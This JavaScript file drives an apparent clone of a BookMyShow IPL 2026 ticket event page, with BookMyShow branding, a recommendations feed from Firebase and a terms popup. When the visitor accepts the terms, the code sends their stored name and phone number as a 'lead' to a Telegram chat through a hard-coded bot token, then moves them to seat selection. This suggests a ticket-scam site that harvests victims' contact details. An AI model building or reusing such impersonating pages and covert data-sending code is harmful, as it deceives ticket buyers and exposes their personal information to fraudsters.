const container = document.getElementById('event-container');
const footer = document.getElementById('event-footer');
const priceBox = document.getElementById('event-price');

const popup = document.getElementById('tnc-modal');
const box = document.getElementById('popup-box');

let startY = 0;
window.matchDataMap = {}; // Global variable

// ==========================================
// 🔥 GET FULL MATCH DATA
// ==========================================
let match = null;

try {
    const rawData = localStorage.getItem('selectedMatch');
    match = rawData ? JSON.parse(rawData) : null;
} catch (e) {
    match = null;
    console.error("LocalStorage Error", e);
}

// ❌ NO MATCH FOUND
if (!match) {
    if (container) {
        container.innerHTML = `<div class="loading-container"><p class="font-medium text-red-500">No Match Selected.</p><a href="index.html" class="mt-4 bg-gray-800 text-white px-4 py-2 rounded">Go Back</a></div>`;
    }
} else {

    // SAVE ID FOR NEXT PAGE
    if (match.id) {
        localStorage.setItem("matchId", match.id);
    }

    // 🔥 DYNAMIC HEADER UPDATE 🔥
    const headerTitle = document.getElementById('header-match-title');
    if (headerTitle && match.title) {
        headerTitle.innerText = match.title;
    }

    const teams = (match.title || "Match").split(' vs ');

    // 🔥 MAIN UI RENDER
    container.innerHTML = `
    <div style="padding: 12px 16px; background: white; font-family: 'Inter', sans-serif; padding-bottom: 80px; overflow-x: hidden;">
        
        <div style="position: relative;">
            <img src="${match.banner}" style="width:100%; border-radius:12px; object-fit: cover; box-shadow: 0 4px 10px rgba(0,0,0,0.1);" onerror="this.src='https://via.placeholder.com/800x400?text=Banner+Not+Available'">
        </div>

        <div style="margin-top: 12px;">
            <span style="background:#f1f2f4; color: #333; padding:4px 8px; font-size:10px; font-weight: 700; border-radius:4px; text-transform: uppercase;">Cricket</span>
        </div>

        <div style="display: flex; justify-content: space-between; align-items: center; background: #f8f9fa; border-radius: 8px; padding: 12px; margin-top: 16px;">
            <div style="display: flex; align-items: flex-start; gap: 10px;">
                <div style="color: #22c55e; font-size: 18px;">👍</div>
                <div>
                    <div style="font-weight: 700; font-size: 13px; color: #333;">78.1k are interested</div>
                    <div style="font-size: 11px; color: #666; margin-top: 2px;">Mark interested to know more about this event</div>
                </div>
            </div>
            <button style="border: 1px solid #f84464; color: #f84464; background: transparent; padding: 6px 12px; border-radius: 6px; font-size: 12px; font-weight: 600;">Interested?</button>
        </div>

        <div style="margin-top: 20px; display: flex; flex-direction: column; gap: 14px; font-size: 13px; color: #333; font-weight: 500;">
            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">📅</span><span>${match.date || 'Sun 29 Mar 2026'}</span></div>
            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">⏰</span><span>${match.time || '7:30 PM'}</span></div>
            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">⌛</span><span>5 Hours</span></div>
            <div style="display: flex; align-items: center; gap: 12px;"><span style="font-size:16px;">🗣️</span><span>English</span></div>
            <div style="display: flex; align-items: flex-start; gap: 12px;"><span style="font-size:16px;">📍</span><span style="flex: 1; line-height: 1.4;">${match.venue || 'Wankhede Stadium: Mumbai'}</span></div>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div style="display: flex; justify-content: space-between; align-items: center; background: #fff; border: 1px solid #eee; border-radius: 8px; padding: 10px 12px; box-shadow: 0 2px 4px rgba(0,0,0,0.02);">
            <div style="display: flex; align-items: center; gap: 10px;">
                <div style="width: 32px; height: 32px; background: #ffebee; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 16px;">🏏</div>
                <span style="font-size: 11px; font-weight: 700; color: #333;">EXPLORE THE TOURNAMENT HOMEPAGE</span>
            </div>
            <span style="color: #999; font-size: 14px; font-weight: bold;">›</span>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div style="background: #fff5f3; border-radius: 8px; padding: 16px; border: 1px solid #feeadc;">
            <h3 style="font-size: 15px; font-weight: 700; color: #333; margin-bottom: 12px;">You should know</h3>
            <div style="display: flex; gap: 12px;">
                <span style="font-size: 22px;">💡</span>
                <div>
                    <p style="font-size: 12px; color: #333; font-weight: 600; margin-bottom: 6px;">Important Info:</p>
                    <ul style="font-size: 12px; color: #555; padding-left: 16px; margin: 0; line-height: 1.5;">
                        <li style="margin-bottom: 6px;">Ticket limit for this booking is 10 tickets per user.</li>
                        <li>Valid ID proof is required for stadium entry.</li>
                    </ul>
                    <div style="color: #f84464; font-size: 12px; font-weight: 600; margin-top: 8px;">Read More</div>
                </div>
            </div>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div>
            <h3 style="font-size: 16px; font-weight: 700; color: #333; margin-bottom: 10px;">About The Event</h3>
            <p style="font-size: 13px; color: #555; line-height: 1.6; margin: 0;">
                Book tickets for <b>${teams[0] || 'Team A'} vs ${teams[1] || 'Team B'}</b> IPL 2026 on ${match.date || 'match day'} at ${match.venue || 'the stadium'} only on BookMyShow.
            </p>
            <div style="color: #f84464; font-size: 13px; font-weight: 600; margin-top: 8px;">Read More</div>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div style="display: flex; align-items: flex-start; gap: 12px; background: #f8f9fa; padding: 16px; border-radius: 8px;">
            <span style="font-size: 22px;">📱</span>
            <div>
                <p style="font-size: 13px; color: #333; font-weight: 500; margin: 0; line-height: 1.4;">Contactless Ticketing & Fast-track Entry with M-ticket.</p>
                <div style="color: #f84464; font-size: 12px; font-weight: 600; margin-top: 6px;">Learn How</div>
            </div>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 20px -16px;"></div>

        <div class="tnc-link" onclick="openTnc()" style="display: flex; justify-content: space-between; align-items: center; padding: 16px 0; border-top: 1px solid #eee; border-bottom: 1px solid #eee; cursor: pointer;">
            <span style="font-size: 13px; font-weight: 500; color: #333;">Terms & Conditions</span>
            <span style="color: #999; font-size: 14px; font-weight: bold;">›</span>
        </div>

        <div style="height: 10px; background: #f4f5f7; margin: 0 -16px 20px;"></div>

        <div style="margin-top: 10px;">
            <h3 style="font-size: 16px; font-weight: 700; color: #333; margin-bottom: 4px;">You May Also Like</h3>
            <p style="font-size: 12px; color: #666; margin-bottom: 16px;">Events around you, book now</p>
            
            <div id="dynamic-matches-container" style="display: flex; gap: 12px; overflow-x: auto; padding-bottom: 10px; scrollbar-width: none;">
                <div style="font-size: 13px; color: #999; padding: 10px 0;">Loading more matches...</div>
            </div>
        </div>

    </div>

    <div style="background: #333; padding: 40px 20px; text-align: center; margin: 0 -16px;">
        <img src="https://getlogo.net/wp-content/uploads/2020/04/bookmyshow-logo-vector-xs.png" style="height: 30px; margin: 0 auto 20px; filter: brightness(0) invert(1);">
        
        <div style="display: flex; justify-content: center; gap: 12px; margin-bottom: 24px; flex-wrap: wrap;">
            
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center;">
                <svg viewBox="0 0 320 512" width="16" height="16"><path fill="#000" d="M279.1 288l14.2-92.7h-88.9V135c0-25.3 12.4-50.1 52.2-50.1h40.4V6.3S260.4 0 225.4 0c-73.2 0-121.1 44.4-121.1 124.7v70.6H22.9V288h81.4v224h100.2V288z"/></svg>
            </div>
            
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center;">
                <svg viewBox="0 0 512 512" width="16" height="16"><path fill="#000" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg>
            </div>
            
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center;">
                <svg viewBox="0 0 448 512" width="16" height="16"><path fill="#000" d="M224.1 141c-63.6 0-114.9 51.3-114.9 114.9s51.3 114.9 114.9 114.9S339 319.5 339 255.9 287.7 141 224.1 141zm0 189.6c-41.1 0-74.7-33.5-74.7-74.7s33.5-74.7 74.7-74.7 74.7 33.5 74.7 74.7-33.6 74.7-74.7 74.7zm146.4-194.3c0 14.9-12 26.8-26.8 26.8-14.9 0-26.8-12-26.8-26.8s12-26.8 26.8-26.8 26.8 12 26.8 26.8zm76.1 27.2c-1.7-35.9-9.9-67.7-36.2-93.9-26.2-26.2-58-34.4-93.9-36.2-37-2.1-147.9-2.1-184.9 0-35.8 1.7-67.6 9.9-93.9 36.1s-34.4 58-36.2 93.9c-2.1 37-2.1 147.9 0 184.9 1.7 35.9 9.9 67.7 36.2 93.9s58 34.4 93.9 36.2c37 2.1 147.9 2.1 184.9 0 35.9-1.7 67.7-9.9 93.9-36.2 26.2-26.2 34.4-58 36.2-93.9 2.1-37 2.1-147.8 0-184.8zM398.8 388c-7.8 19.6-22.9 34.7-42.6 42.6-29.5 11.7-99.5 9-132.1 9s-102.7 2.6-132.1-9c-19.6-7.8-34.7-22.9-42.6-42.6-11.7-29.5-9-99.5-9-132.1s-2.6-102.7 9-132.1c7.8-19.6 22.9-34.7 42.6-42.6 29.5-11.7 99.5-9 132.1-9s102.7-2.6 132.1 9c19.6 7.8 34.7 22.9 42.6 42.6 11.7 29.5 9 99.5 9 132.1s2.7 102.7-9 132.1z"/></svg>
            </div>
            
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center;">
                <svg viewBox="0 0 576 512" width="16" height="16"><path fill="#000" d="M549.7 124.1c-6.3-23.7-24.8-42.3-48.3-48.6C458.8 64 288 64 288 64S117.2 64 74.6 75.5c-23.5 6.3-42 24.9-48.3 48.6-11.4 42.9-11.4 132.3-11.4 132.3s0 89.4 11.4 132.3c6.3 23.7 24.8 41.5 48.3 47.8C117.2 448 288 448 288 448s170.8 0 213.4-11.5c23.5-6.3 42-24.2 48.3-47.8 11.4-42.9 11.4-132.3 11.4-132.3s0-89.4-11.4-132.3zm-317.5 213.5V175.2l142.7 81.2-142.7 81.2z"/></svg>
            </div>
            
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center;">
                <svg viewBox="0 0 496 512" width="16" height="16"><path fill="#000" d="M248 8C111 8 0 119 0 256c0 105.4 65.1 195.4 157.1 236.4-2.1-19.6-4.1-49.8 .9-71.3 4.3-18.4 27.6-117.2 27.6-117.2s-7.1-14.2-7.1-35.1c0-32.9 19.1-57.5 42.8-57.5 19.8 0 29.4 14.9 29.4 32.8 0 19.9-12.7 49.7-19.2 77.4-5.5 23.2 11.6 42.2 34.5 42.2 41.4 0 73.2-43.7 73.2-106.8 0-55.8-40.1-94.8-97.4-94.8-66.2 0-105.1 49.7-105.1 100.9 0 19.1 7.3 39.5 16.5 50.6 1.8 2.2 2.1 4.1 1.5 8.1-1.7 11.8-5.6 38.6-6.4 43.1-1.1 6.1-3.7 7.4-9.9 4.5-36.9-17.5-60-72.7-60-117.1 0-95.3 69.3-182.7 199.3-182.7 104.3 0 185.3 74.3 185.3 173.6 0 103.7-65.3 187.1-155.9 187.1-30.5 0-59.2-15.8-69-34.6 0 0-15.1 57.6-18.8 71.8-6.8 26.1-25.2 58.7-37.5 78.6 31.3 9.6 64.6 14.8 99 14.8 137 0 248-111 248-248S385 8 248 8z"/></svg>
            </div>
            
            <div style="width: 36px; height: 36px; border-radius: 50%; background: #fff; display: flex; align-items: center; justify-content: center;">
                <svg viewBox="0 0 448 512" width="16" height="16"><path fill="#000" d="M100.3 448H7.4V148.9h92.9zM53.8 108.1C24.1 108.1 0 83.5 0 53.8a53.8 53.8 0 0 1 107.6 0c0 29.7-24.1 54.3-53.8 54.3zM447.9 448h-92.7V302.4c0-34.7-.7-79.2-48.3-79.2-48.3 0-55.7 37.7-55.7 76.7V448h-92.8V148.9h89.1v40.8h1.3c12.4-23.5 42.7-48.3 87.9-48.3 94 0 111.3 61.9 111.3 142.3V448z"/></svg>
            </div>
            
        </div>
        
        <p style="font-size: 11px; color: #888; line-height: 1.6; margin: 0;">
            Copyright 2026 © Bigtree Entertainment Pvt. Ltd. All Rights Reserved.<br><br>
            The content and images used on this site are copyright protected and copyrights vests with the respective owners. The usage of the content and images on this website is intended to promote the works and no endorsement of the artist shall be implied. Unauthorized use is prohibited and punishable by law.
        </p>
    </div>
    `;

    if (footer) footer.style.display = "flex";
    if (priceBox) priceBox.innerText = `₹${match.price || 0} onwards`;

    // ==========================================
    // 🔥 SAFE FIREBASE DYNAMIC LOAD FOR RECOMMENDATIONS
    // ==========================================
    const dynamicContainer = document.getElementById('dynamic-matches-container');
    
    import('./firebase.js').then((firebaseModule) => {
        const { db, ref, onValue } = firebaseModule;
        
        if (dynamicContainer) {
            onValue(ref(db, 'matches'), (snapshot) => {
                if (snapshot.exists()) {
                    dynamicContainer.innerHTML = ''; 
                    const allMatches = snapshot.val();
                    let addedCount = 0;

                    for (let key in allMatches) {
                        const m = allMatches[key];
                        
                        if (m.id === match.id || key === match.id || m.title === match.title) continue;
                        if (addedCount >= 5) break;

                        const title = m.title || "Match";
                        const matchId = m.id || key;
                        const banner = m.banner || "https://via.placeholder.com/400x600";
                        const date = m.date || "TBA";
                        const price = m.price || 0;

                        window.matchDataMap[matchId] = m;

                        const cardHtml = `
                        <div style="min-width: 130px; width: 130px; cursor: pointer;" onclick="selectRecommendedMatch('${matchId}')">
                            <img src="${banner}" style="width: 100%; border-radius: 8px; object-fit: cover; height: 195px; box-shadow: 0 2px 6px rgba(0,0,0,0.1);">
                            <div style="font-size: 13px; font-weight: 600; color: #333; margin-top: 8px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis;">${title}</div>
                            <div style="font-size: 11px; color: #666; margin-top: 2px;">${date}</div>
                            <div style="font-size: 11px; color: #f84464; font-weight: bold; margin-top: 2px;">₹${price} onwards</div>
                        </div>
                        `;
                        dynamicContainer.innerHTML += cardHtml;
                        addedCount++;
                    }

                    if (addedCount === 0) {
                        dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No other matches available right now.</div>';
                    }
                } else {
                    dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">No matches found.</div>';
                }
            });
        }
    }).catch(err => {
        console.warn("Firebase import failed, skipping recommendations.", err);
        if(dynamicContainer) dynamicContainer.innerHTML = '<div style="font-size:12px; color:#999; padding:10px 0;">Could not load more matches.</div>';
    });

}

// ==========================================
// 🔥 CHANGE MATCH ON RECOMMENDATION CLICK
// ==========================================
window.selectRecommendedMatch = (id) => {
    const selected = window.matchDataMap[id];
    if(selected) {
        localStorage.setItem('selectedMatch', JSON.stringify(selected));
        window.location.reload(); 
    }
}

// ==========================================
// 🔥 POPUP LOGIC
// ==========================================
window.openTnc = () => {
    if (popup) popup.classList.add('active');
};

function closePopup() {
    if (popup) popup.classList.remove('active');
    if (box) box.style.transform = 'translateY(0)';
}

const closeBtn = document.getElementById('close-popup');
if (closeBtn) {
    closeBtn.onclick = closePopup;
}

if (popup) {
    popup.addEventListener('click', (e) => {
        if (e.target === popup) closePopup();
    });
}

// ==========================================
// 🔥 ACCEPT → GO TO SEATS
// ==========================================
const acceptBtn = document.getElementById('accept-tnc-btn');
if (acceptBtn) {
    acceptBtn.onclick = async () => {
        
        acceptBtn.innerText = "Processing...";
        acceptBtn.style.pointerEvents = "none";

        const loader = document.createElement('div');
        loader.innerHTML = `
            <div style="position:fixed; top:0; left:0; width:100%; height:100%; background:rgba(255,255,255,0.95); z-index:99999; display:flex; flex-direction:column; justify-content:center; align-items:center; backdrop-filter:blur(5px);">
                <div style="width: 45px; height: 45px; border: 4px solid #f3f3f3; border-top: 4px solid #f84464; border-radius: 50%; animation: load-spin 1s linear infinite;"></div>
                <h3 style="margin-top:20px; color:#333; font-family:sans-serif; font-size:18px; font-weight:700;">Getting Things Ready...</h3>
                <p style="color:#666; font-size:13px; margin-top:5px; font-weight:500;">Moving to Seat Selection</p>
                <style>
                    @keyframes load-spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
                </style>
            </div>
        `;
        document.body.appendChild(loader);
        
        if (typeof fbq !== "undefined") {
            fbq('track', 'InitiateCheckout');
        }

        const name = localStorage.getItem('customerName') || "Unknown";
        const phone = localStorage.getItem('customerPhone') || "Unknown";
        const matchTitle = match ? match.title : "Unknown Match";

        const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
        const chatId = "6820660513"; 
        
        const telegramMsg = `🔥 *LEAD MOVED FORWARD! (Event Page)* 🔥\n\n` +
                            `👤 *Name:* ${name}\n` +
                            `📞 *WhatsApp:* ${phone}\n` +
                            `🏏 *Match:* ${matchTitle}\n` +
                            `👉 *Action:* Accepted T&C, moving to Seat Selection!`;

        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;

        try {
            await fetch(url);
        } catch (e) {
            console.log("Telegram Error");
        } finally {
            closePopup();
            localStorage.setItem('selectedMatch', JSON.stringify(match));
            window.location.href = "seats.html";
        }
    };
}

// ==========================================
// 🔥 BOOK BUTTON
// ==========================================
const bookNowBtn = document.getElementById('book-now-btn');
if (bookNowBtn) {
    bookNowBtn.onclick = () => {
        openTnc();
    };
}

// =================
